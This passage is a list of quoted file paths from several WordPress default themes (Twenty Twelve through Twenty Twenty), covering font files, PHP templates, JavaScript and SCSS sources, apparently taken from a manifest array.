    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-latin-ext-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-latin-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-cyrillic-ext-700-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-all-700-normal.woff",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-vietnamese-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-vietnamese-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-greek-ext-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-greek-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-cyrillic-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-greek-ext-700-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-latin-700-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-cyrillic-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-latin-ext-700-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-greek-700-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-vietnamese-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-greek-ext-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-latin-ext-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-latin-ext-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-cyrillic-ext-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/LICENSE.txt",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-greek-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-greek-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-cyrillic-700-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-vietnamese-700-italic.woff2",
    "wp-content/themes/twentyfifteen/content-search.php",
    "wp-content/themes/twentyfifteen/footer.php",
    "wp-content/themes/twentyfifteen/404.php",
    "wp-content/themes/twentyfifteen/archive.php",
    "wp-content/themes/twentyfifteen/page.php",
    "wp-content/themes/twentyfifteen/functions.php",
    "wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js",
    "wp-content/themes/twentyfifteen/js/functions.js",
    "wp-content/themes/twentyfifteen/js/color-scheme-control.js",
    "wp-content/themes/twentyfifteen/js/customize-preview.js",
    "wp-content/themes/twentyfifteen/js/keyboard-image-navigation.js",
    "wp-content/themes/twentyfifteen/js/html5.js",
    "wp-content/themes/twentyfifteen/genericons/Genericons.eot",
    "wp-content/themes/twentyfifteen/genericons/README.md",
    "wp-content/themes/twentyfifteen/genericons/Genericons.woff",
    "wp-content/themes/twentyfifteen/genericons/COPYING.txt",
    "wp-content/themes/twentyfifteen/genericons/Genericons.ttf",
    "wp-content/themes/twentyfifteen/genericons/Genericons.svg",
    "wp-content/themes/twentyfifteen/genericons/LICENSE.txt",
    "wp-content/themes/twentyfifteen/header.php",
    "wp-content/themes/twentyfifteen/content.php",
    "wp-content/themes/twentyfifteen/single.php",
    "wp-content/themes/twentyfifteen/sidebar.php",
    "wp-content/themes/twentyfifteen/content-none.php",
    "wp-content/themes/twentyfifteen/inc/customizer.php",
    "wp-content/themes/twentyfifteen/inc/custom-header.php",
    "wp-content/themes/twentyfifteen/inc/template-tags.php",
    "wp-content/themes/twentyfifteen/inc/back-compat.php",
    "wp-content/themes/twentyfifteen/inc/block-patterns.php",
    "wp-content/themes/twentyfifteen/content-page.php",
    "wp-content/themes/twentyfifteen/author-bio.php",
    "wp-content/themes/twentyfifteen/search.php",
    "wp-content/themes/twentyfifteen/index.php",
    "wp-content/themes/twentyfifteen/image.php",
    "wp-content/themes/twentyseventeen/comments.php",
    "wp-content/themes/twentyseventeen/readme.txt",
    "wp-content/themes/twentyseventeen/template-parts/page/content-front-page.php",
    "wp-content/themes/twentyseventeen/template-parts/page/content-front-page-panels.php",
    "wp-content/themes/twentyseventeen/template-parts/page/content-page.php",
    "wp-content/themes/twentyseventeen/template-parts/footer/site-info.php",
    "wp-content/themes/twentyseventeen/template-parts/footer/footer-widgets.php",
    "wp-content/themes/twentyseventeen/template-parts/header/site-branding.php",
    "wp-content/themes/twentyseventeen/template-parts/header/header-image.php",
    "wp-content/themes/twentyseventeen/template-parts/navigation/navigation-top.php",
    "wp-content/themes/twentyseventeen/template-parts/post/content-audio.php",
    "wp-content/themes/twentyseventeen/template-parts/post/content-image.php",
    "wp-content/themes/twentyseventeen/template-parts/post/content-video.php",
    "wp-content/themes/twentyseventeen/template-parts/post/content.php",
    "wp-content/themes/twentyseventeen/template-parts/post/content-none.php",
    "wp-content/themes/twentyseventeen/template-parts/post/content-gallery.php",
    "wp-content/themes/twentyseventeen/template-parts/post/content-excerpt.php",
    "wp-content/themes/twentyseventeen/assets/images/svg-icons.svg",
    "wp-content/themes/twentyseventeen/assets/js/customize-controls.js",
    "wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js",
    "wp-content/themes/twentyseventeen/assets/js/global.js",
    "wp-content/themes/twentyseventeen/assets/js/navigation.js",
    "wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js",
    "wp-content/themes/twentyseventeen/assets/js/customize-preview.js",
    "wp-content/themes/twentyseventeen/assets/js/html5.js",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-ext-400-italic.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-600-italic.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-600-normal.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-ext-800-italic.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-vietnamese-800-italic.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-vietnamese-400-italic.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-300-italic.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-all-800-normal.woff",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-all-600-italic.woff",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-ext-400-normal.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-800-normal.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-all-400-normal.woff",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-all-400-italic.woff",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-vietnamese-600-normal.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-all-300-normal.woff",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-800-italic.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-vietnamese-800-normal.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-ext-800-normal.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-vietnamese-400-normal.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-vietnamese-300-normal.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-all-300-italic.woff",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-vietnamese-300-italic.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-ext-300-normal.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-400-normal.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-ext-600-normal.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-ext-600-italic.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-400-italic.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-ext-300-italic.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-vietnamese-600-italic.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-all-800-italic.woff",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-latin-300-normal.woff2",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/LICENSE.txt",
    "wp-content/themes/twentyseventeen/assets/fonts/libre-franklin/libre-franklin-all-600-normal.woff",
    "wp-content/themes/twentyseventeen/footer.php",
    "wp-content/themes/twentyseventeen/404.php",
    "wp-content/themes/twentyseventeen/archive.php",
    "wp-content/themes/twentyseventeen/page.php",
    "wp-content/themes/twentyseventeen/functions.php",
    "wp-content/themes/twentyseventeen/header.php",
    "wp-content/themes/twentyseventeen/front-page.php",
    "wp-content/themes/twentyseventeen/single.php",
    "wp-content/themes/twentyseventeen/sidebar.php",
    "wp-content/themes/twentyseventeen/inc/customizer.php",
    "wp-content/themes/twentyseventeen/inc/color-patterns.php",
    "wp-content/themes/twentyseventeen/inc/icon-functions.php",
    "wp-content/themes/twentyseventeen/inc/custom-header.php",
    "wp-content/themes/twentyseventeen/inc/template-tags.php",
    "wp-content/themes/twentyseventeen/inc/template-functions.php",
    "wp-content/themes/twentyseventeen/inc/back-compat.php",
    "wp-content/themes/twentyseventeen/inc/block-patterns.php",
    "wp-content/themes/twentyseventeen/search.php",
    "wp-content/themes/twentyseventeen/searchform.php",
    "wp-content/themes/twentyseventeen/index.php",
    "wp-content/themes/twentytwelve/comments.php",
    "wp-content/themes/twentytwelve/readme.txt",
    "wp-content/themes/twentytwelve/content-link.php",
    "wp-content/themes/twentytwelve/sidebar-front.php",
    "wp-content/themes/twentytwelve/footer.php",
    "wp-content/themes/twentytwelve/content-status.php",
    "wp-content/themes/twentytwelve/404.php",
    "wp-content/themes/twentytwelve/archive.php",
    "wp-content/themes/twentytwelve/content-image.php",
    "wp-content/themes/twentytwelve/author.php",
    "wp-content/themes/twentytwelve/page.php",
    "wp-content/themes/twentytwelve/page-templates/full-width.php",
    "wp-content/themes/twentytwelve/page-templates/front-page.php",
    "wp-content/themes/twentytwelve/content-quote.php",
    "wp-content/themes/twentytwelve/content-aside.php",
    "wp-content/themes/twentytwelve/functions.php",
    "wp-content/themes/twentytwelve/js/navigation.js",
    "wp-content/themes/twentytwelve/js/theme-customizer.js",
    "wp-content/themes/twentytwelve/js/html5.js",
    "wp-content/themes/twentytwelve/header.php",
    "wp-content/themes/twentytwelve/content.php",
    "wp-content/themes/twentytwelve/single.php",
    "wp-content/themes/twentytwelve/sidebar.php",
    "wp-content/themes/twentytwelve/content-none.php",
    "wp-content/themes/twentytwelve/inc/custom-header.php",
    "wp-content/themes/twentytwelve/inc/block-patterns.php",
    "wp-content/themes/twentytwelve/tag.php",
    "wp-content/themes/twentytwelve/content-page.php",
    "wp-content/themes/twentytwelve/category.php",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-cyrillic-700-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-latin-ext-400-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-vietnamese-700-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-cyrillic-700-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-hebrew-400-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-vietnamese-400-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-cyrillic-ext-700-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-cyrillic-ext-400-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-vietnamese-700-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-cyrillic-400-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-all-400-normal.woff",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-greek-ext-700-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-vietnamese-400-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-all-700-normal.woff",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-latin-400-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-cyrillic-400-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-greek-700-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-greek-400-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-hebrew-400-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-latin-400-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-cyrillic-ext-700-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-all-400-italic.woff",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-cyrillic-ext-400-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-greek-ext-400-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-latin-ext-700-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-hebrew-700-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-greek-400-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-latin-700-italic.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-latin-700-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-all-700-italic.woff",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-latin-ext-700-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-hebrew-700-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-greek-ext-400-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-greek-700-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-greek-ext-700-normal.woff2",
    "wp-content/themes/twentytwelve/fonts/open-sans/LICENSE.txt",
    "wp-content/themes/twentytwelve/fonts/open-sans/open-sans-latin-ext-400-normal.woff2",
    "wp-content/themes/twentytwelve/search.php",
    "wp-content/themes/twentytwelve/index.php",
    "wp-content/themes/twentytwelve/image.php",
    "wp-content/themes/twentytwenty/comments.php",
    "wp-content/themes/twentytwenty/readme.txt",
    "wp-content/themes/twentytwenty/template-parts/pagination.php",
    "wp-content/themes/twentytwenty/template-parts/modal-search.php",
    "wp-content/themes/twentytwenty/template-parts/modal-menu.php",
    "wp-content/themes/twentytwenty/template-parts/footer-menus-widgets.php",
    "wp-content/themes/twentytwenty/template-parts/navigation.php",
    "wp-content/themes/twentytwenty/template-parts/entry-header.php",
    "wp-content/themes/twentytwenty/template-parts/featured-image.php",
    "wp-content/themes/twentytwenty/template-parts/content.php",
    "wp-content/themes/twentytwenty/template-parts/content-cover.php",
    "wp-content/themes/twentytwenty/template-parts/entry-author-bio.php",
    "wp-content/themes/twentytwenty/.npmrc",
    "wp-content/themes/twentytwenty/assets/js/customize-controls.js",
    "wp-content/themes/twentytwenty/assets/js/skip-link-focus-fix.js",
    "wp-content/themes/twentytwenty/assets/js/editor-script-block.js",
    "wp-content/themes/twentytwenty/assets/js/customize.js",
    "wp-content/themes/twentytwenty/assets/js/index.js",
    "wp-content/themes/twentytwenty/assets/js/customize-preview.js",
    "wp-content/themes/twentytwenty/assets/js/color-calculations.js",
    "wp-content/themes/twentytwenty/assets/fonts/inter/Inter-upright-var.woff2",
    "wp-content/themes/twentytwenty/assets/fonts/inter/Inter-italic-var.woff2",
    "wp-content/themes/twentytwenty/footer.php",
    "wp-content/themes/twentytwenty/404.php",
    "wp-content/themes/twentytwenty/functions.php",
    "wp-content/themes/twentytwenty/singular.php",
    "wp-content/themes/twentytwenty/package-lock.json",
    "wp-content/themes/twentytwenty/header.php",
    "wp-content/themes/twentytwenty/inc/starter-content.php",
    "wp-content/themes/twentytwenty/inc/template-tags.php",
    "wp-content/themes/twentytwenty/inc/custom-css.php",
    "wp-content/themes/twentytwenty/inc/block-patterns.php",
    "wp-content/themes/twentytwenty/inc/svg-icons.php",
    "wp-content/themes/twentytwenty/.stylelintrc.json",
    "wp-content/themes/twentytwenty/package.json",
    "wp-content/themes/twentytwenty/classes/class-twentytwenty-svg-icons.php",
    "wp-content/themes/twentytwenty/classes/class-twentytwenty-non-latin-languages.php",
    "wp-content/themes/twentytwenty/classes/class-twentytwenty-walker-comment.php",
    "wp-content/themes/twentytwenty/classes/class-twentytwenty-script-loader.php",
    "wp-content/themes/twentytwenty/classes/class-twentytwenty-separator-control.php",
    "wp-content/themes/twentytwenty/classes/class-twentytwenty-walker-page.php",
    "wp-content/themes/twentytwenty/classes/class-twentytwenty-customize.php",
    "wp-content/themes/twentytwenty/templates/template-cover.php",
    "wp-content/themes/twentytwenty/templates/template-full-width.php",
    "wp-content/themes/twentytwenty/searchform.php",
    "wp-content/themes/twentytwenty/index.php",
    "wp-content/themes/twentythirteen/comments.php",
    "wp-content/themes/twentythirteen/readme.txt",
    "wp-content/themes/twentythirteen/content-link.php",
    "wp-content/themes/twentythirteen/content-audio.php",
    "wp-content/themes/twentythirteen/footer.php",
    "wp-content/themes/twentythirteen/content-status.php",
    "wp-content/themes/twentythirteen/404.php",
    "wp-content/themes/twentythirteen/archive.php",
    "wp-content/themes/twentythirteen/content-image.php",
    "wp-content/themes/twentythirteen/author.php",
    "wp-content/themes/twentythirteen/page.php",
    "wp-content/themes/twentythirteen/content-quote.php",
    "wp-content/themes/twentythirteen/content-chat.php",
    "wp-content/themes/twentythirteen/content-aside.php",
    "wp-content/themes/twentythirteen/functions.php",
    "wp-content/themes/twentythirteen/sidebar-main.php",
    "wp-content/themes/twentythirteen/js/functions.js",
    "wp-content/themes/twentythirteen/js/theme-customizer.js",
    "wp-content/themes/twentythirteen/js/html5.js",
    "wp-content/themes/twentythirteen/genericons/font/genericons-regular-webfont.eot",
    "wp-content/themes/twentythirteen/genericons/font/genericons-regular-webfont.ttf",
    "wp-content/themes/twentythirteen/genericons/font/genericons-regular-webfont.svg",
    "wp-content/themes/twentythirteen/genericons/font/genericons-regular-webfont.woff",
    "wp-content/themes/twentythirteen/genericons/Genericons-Regular.otf",
    "wp-content/themes/twentythirteen/genericons/README.txt",
    "wp-content/themes/twentythirteen/genericons/COPYING.txt",
    "wp-content/themes/twentythirteen/genericons/LICENSE.txt",
    "wp-content/themes/twentythirteen/content-video.php",
    "wp-content/themes/twentythirteen/header.php",
    "wp-content/themes/twentythirteen/content.php",
    "wp-content/themes/twentythirteen/single.php",
    "wp-content/themes/twentythirteen/sidebar.php",
    "wp-content/themes/twentythirteen/content-none.php",
    "wp-content/themes/twentythirteen/inc/custom-header.php",
    "wp-content/themes/twentythirteen/inc/back-compat.php",
    "wp-content/themes/twentythirteen/inc/block-patterns.php",
    "wp-content/themes/twentythirteen/tag.php",
    "wp-content/themes/twentythirteen/taxonomy-post_format.php",
    "wp-content/themes/twentythirteen/content-gallery.php",
    "wp-content/themes/twentythirteen/category.php",
    "wp-content/themes/twentythirteen/author-bio.php",
    "wp-content/themes/twentythirteen/fonts/bitter/bitter-latin-700-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/bitter/bitter-all-400-normal.woff",
    "wp-content/themes/twentythirteen/fonts/bitter/bitter-vietnamese-700-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/bitter/bitter-latin-ext-400-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/bitter/bitter-cyrillic-ext-400-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/bitter/bitter-all-700-normal.woff",
    "wp-content/themes/twentythirteen/fonts/bitter/bitter-latin-400-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/bitter/bitter-vietnamese-400-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/bitter/bitter-latin-ext-700-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/bitter/bitter-cyrillic-400-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/bitter/bitter-cyrillic-ext-700-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/bitter/LICENSE.txt",
    "wp-content/themes/twentythirteen/fonts/bitter/bitter-cyrillic-700-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-all-700-normal.woff",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-cyrillic-400-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-vietnamese-300-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-latin-700-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-latin-ext-700-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-cyrillic-ext-700-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-latin-ext-300-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-latin-ext-400-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-latin-300-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-all-700-italic.woff",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-cyrillic-300-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-vietnamese-400-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-greek-ext-400-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-vietnamese-700-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-cyrillic-700-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-all-400-normal.woff",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-cyrillic-ext-400-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-cyrillic-700-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-greek-400-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-vietnamese-700-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-cyrillic-ext-400-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-greek-ext-400-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-latin-ext-300-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-all-300-italic.woff",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-greek-ext-300-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-vietnamese-400-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-greek-700-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-all-300-normal.woff",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-greek-ext-300-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-latin-ext-400-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-greek-ext-700-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-greek-300-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-latin-300-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-all-400-italic.woff",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-cyrillic-ext-300-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-greek-700-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-cyrillic-ext-700-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-greek-400-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-latin-400-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-latin-700-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-greek-300-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-cyrillic-ext-300-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-latin-ext-700-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-greek-ext-700-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/LICENSE.txt",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-latin-400-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-cyrillic-300-normal.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-cyrillic-400-italic.woff2",
    "wp-content/themes/twentythirteen/fonts/source-sans-pro/source-sans-pro-vietnamese-300-italic.woff2",
    "wp-content/themes/twentythirteen/search.php",
    "wp-content/themes/twentythirteen/index.php",
    "wp-content/themes/twentythirteen/image.php",
    "wp-content/themes/twentynineteen/comments.php",
    "wp-content/themes/twentynineteen/readme.txt",
    "wp-content/themes/twentynineteen/template-parts/footer/footer-widgets.php",
    "wp-content/themes/twentynineteen/template-parts/header/site-branding.php",
    "wp-content/themes/twentynineteen/template-parts/header/entry-header.php",
    "wp-content/themes/twentynineteen/template-parts/content/content-single.php",
    "wp-content/themes/twentynineteen/template-parts/content/content.php",
    "wp-content/themes/twentynineteen/template-parts/content/content-none.php",
    "wp-content/themes/twentynineteen/template-parts/content/content-page.php",
    "wp-content/themes/twentynineteen/template-parts/content/content-excerpt.php",
    "wp-content/themes/twentynineteen/template-parts/post/discussion-meta.php",
    "wp-content/themes/twentynineteen/template-parts/post/author-bio.php",
    "wp-content/themes/twentynineteen/footer.php",
    "wp-content/themes/twentynineteen/404.php",
    "wp-content/themes/twentynineteen/archive.php",
    "wp-content/themes/twentynineteen/style-editor-customizer.scss",
    "wp-content/themes/twentynineteen/page.php",
    "wp-content/themes/twentynineteen/style-editor.scss",
    "wp-content/themes/twentynineteen/functions.php",
    "wp-content/themes/twentynineteen/js/customize-controls.js",
    "wp-content/themes/twentynineteen/js/priority-menu.js",
    "wp-content/themes/twentynineteen/js/skip-link-focus-fix.js",
    "wp-content/themes/twentynineteen/js/touch-keyboard-navigation.js",
    "wp-content/themes/twentynineteen/js/customize-preview.js",
    "wp-content/themes/twentynineteen/package-lock.json",
    "wp-content/themes/twentynineteen/header.php",
    "wp-content/themes/twentynineteen/single.php",
    "wp-content/themes/twentynineteen/inc/customizer.php",
    "wp-content/themes/twentynineteen/inc/color-patterns.php",
    "wp-content/themes/twentynineteen/inc/icon-functions.php",
    "wp-content/themes/twentynineteen/inc/template-tags.php",
    "wp-content/themes/twentynineteen/inc/helper-functions.php",
    "wp-content/themes/twentynineteen/inc/template-functions.php",
    "wp-content/themes/twentynineteen/inc/back-compat.php",
    "wp-content/themes/twentynineteen/inc/block-patterns.php",
    "wp-content/themes/twentynineteen/package.json",
    "wp-content/themes/twentynineteen/sass/typography/_headings.scss",
    "wp-content/themes/twentynineteen/sass/typography/_typography.scss",
    "wp-content/themes/twentynineteen/sass/typography/_copy.scss",
    "wp-content/themes/twentynineteen/sass/layout/_layout.scss",
    "wp-content/themes/twentynineteen/sass/site/footer/_site-footer.scss",
    "wp-content/themes/twentynineteen/sass/site/secondary/_widgets.scss",
    "wp-content/themes/twentynineteen/sass/site/header/_site-header.scss",
    "wp-content/themes/twentynineteen/sass/site/header/_site-featured-image.scss",
    "wp-content/themes/twentynineteen/sass/site/_site.scss",
    "wp-content/themes/twentynineteen/sass/site/primary/_comments.scss",
    "wp-content/themes/twentynineteen/sass/site/primary/_archives.scss",
    "wp-content/themes/twentynineteen/sass/site/primary/_posts-and-pages.scss",
    "wp-content/themes/twentynineteen/sass/mixins/_utilities.scss",
    "wp-content/themes/twentynineteen/sass/mixins/_mixins-master.scss",
    "wp-content/themes/twentynineteen/sass/media/_media.scss",
    "wp-content/themes/twentynineteen/sass/media/_galleries.scss",
    "wp-content/themes/twentynineteen/sass/media/_captions.scss",
    "wp-content/themes/twentynineteen/sass/blocks/_blocks.scss",
    "wp-content/themes/twentynineteen/sass/navigation/_navigation.scss",
    "wp-content/themes/twentynineteen/sass/navigation/_menu-footer-navigation.scss",
